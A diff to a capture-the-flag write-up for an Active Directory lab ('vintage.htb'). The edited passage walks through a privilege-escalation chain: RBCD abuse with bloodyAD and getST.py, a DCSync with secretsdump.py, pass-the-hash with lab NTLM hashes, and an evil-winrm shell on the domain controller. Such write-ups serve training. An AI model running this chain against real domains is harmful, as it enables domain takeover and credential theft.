@@ -272,19 +272,21 @@ pypykatz dpapi credential mkf credentialblob
 
 <img width="423" height="105" alt="image" src="https://github.com/user-attachments/assets/bbe35542-1b2e-4b4d-b176-2db2a84e3fc1" />
 
-## 5. Privilege Escalation RBCD
+## 5. Privilege Escalation: Resource-Based Constrained Delegation (RBCD)
 
-When checking the permissions for the DC via the user **c.neri**, we see that they have the right to add members to the **DelegatedAdmins** group. We also note that the **DelegatedAdmins** group has the AllowedAct privilege for the DC.
-More specifically, the AllowedAct permission allows whoever controls that group to forge Kerberos tickets and declare, “I am user X and I want to access the DC” (**RBCD: Resource-Based Constrained Delegation**) .However, there is a caveat: the account that “performs” the impersonation must have an SPN.
+With administrative access via the **c.neri_adm** account, we returned to our BloodHound data to map a path to Domain Admin. BloodHound revealed a critical relationship: **c.neri_adm** holds the right to add members to the **DelegatedAdmins** group. Crucially, the **DelegatedAdmins** group possesses the **AllowedToAct **(AllowedToActOnBehalfOfOtherIdentity) privilege over the Domain Controller (**DC01**).
 
+Vulnerability Insight: The **AllowedToAct** permission introduces a Resource-Based Constrained Delegation (RBCD) vulnerability. It allows whoever controls the group to forge Kerberos Service Tickets (ST) on behalf of any user to access the target resource (the DC). However, there is a strict Kerberos caveat: the account executing the impersonation attack must possess a Service Principal Name (SPN).
 
 <img width="1188" height="355" alt="image" src="https://github.com/user-attachments/assets/40e20a5d-2cbe-4299-a99d-a14979319137" />
 
-For this reason, we use the FS01$ computer account, because c.neri does not have an SPN.
+Since our current user (**c.neri_adm**) lacks an SPN, we cannot use it directly to forge the ticket. To bypass this, we leverage the **FS01$** computer account we compromised earlier in the assessment, as machine accounts possess SPNs by default.
 
 <img width="372" height="134" alt="image" src="https://github.com/user-attachments/assets/01b9beca-edaf-4117-8e69-600aae7d4b8e" />
 
-By default, you cannot impersonate users in the “Protected Users” group. Therefore, choose to impersonate DC01$ (the Domain Controller's machine account) directly. Why? Because Domain Controllers inherently have replication privileges (DCSync). If the DC believes the request is coming from another DC, it will hand over all the hashes.
+### 5.1 Forging the Ticket & DCSync
+
+First, we use our current privileges to add the **FS01$** machine account to the **DelegatedAdmins** group:
 
 ```
 bloodyAD -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$'
@@ -294,12 +296,19 @@ bloodyAD -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' --host dc01
 
 
 
+Next, we must choose which identity to impersonate. While standard domain administrators are often protected against delegation (either by being in the "**ProtectedUsers**" group or having the "**Account is sensitive**" flag enabled), we can impersonate the Domain Controller's own machine account (**DC01$**).
+
+This strategic choice allows us to perform a DCSync attack. Domain Controllers inherently hold the Replicating Directory Changes privileges. If the target DC believes our forged request is coming from a peer Domain Controller, it will synchronize and hand over the entire domain's password hashes.
+
+We utilize Impacket's getST.py to forge the ticket on behalf of DC01$ for the cifs service:
+
 ```
  getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.129.21.207 'vintage.htb/fs01$:fs01'  
 ```
 
 <img width="874" height="151" alt="image" src="https://github.com/user-attachments/assets/0f819786-9b01-458a-b4bd-767ecc67cf67" />
 
+With the forged Service Ticket exported to our environment, we execute secretsdump.py to initiate the DCSync:
 
 ```
 KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb
@@ -307,13 +316,20 @@ KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc
 
 <img width="817" height="807" alt="image" src="https://github.com/user-attachments/assets/cdf475f7-d5b2-4782-a589-2ea7366b11e4" />
 
+### 5.2 Bypassing Network Logon Restrictions for Full Compromise
+
+The DCSync attack successfully extracts the NTLM hash for the built-in Administrator account (RID 500). We attempt to request a Ticket Granting Ticket (TGT) for this account:
 
 ```
 getTGT.py -hashes :468c7497513f8243b59980f2240a10de vintage.htb/administrator@vintage.htb
 ```
 <img width="852" height="84" alt="image" src="https://github.com/user-attachments/assets/a2dd4b8b-1e46-4e97-8b28-a6ed5e654be0" />
 
+While the TGT request succeeds, attempting to use it to gain a remote WinRM shell fails. This occurs because modern security baselines and Active Directory best practices often explicitly deny Network Logon rights (such as WinRM or WMI access) to the default built-in Administrator account.
 
+To circumvent this defense, we pivot to another highly privileged account we extracted from the DCSync: l.bianchi_adm. This is a secondary, human-created Domain Admin account that typically does not suffer from the same default network logon restrictions.
+
+We request a TGT for** l.bianchi_adm:**
 
 ```
 getTGT.py -hashes :501a825be327b9b1c7c7126dc39d5718  vintage.htb/l.bianchi_adm@vintage.htb
@@ -321,26 +337,10 @@ getTGT.py -hashes :501a825be327b9b1c7c7126dc39d5718  vintage.htb/l.bianchi_adm@v
 
 <img width="851" height="85" alt="image" src="https://github.com/user-attachments/assets/f19b88c6-f662-49e7-8833-6dae83c398c4" />
 
+Finally, using the cached Kerberos ticket for the alternative administrator, we authenticate via **evil-winrm** and secure an interactive administrative shell on the Domain Controller, achieving full compromise of the Active Directory domain.
+
 ```
 KRB5CCNAME='l.bianchi_adm@vintage.htb.ccache' evil-winrm -i dc01.vintage.htb -r vintage.htb
 ```
 <img width="636" height="474" alt="image" src="https://github.com/user-attachments/assets/fd8974ea-46fb-4700-8c80-842003acaecd" />
-
-
-```
-```
-```
-```
-```
-```
-```
-```
-```
-```
-```
-```
-```
-```
-
-
 
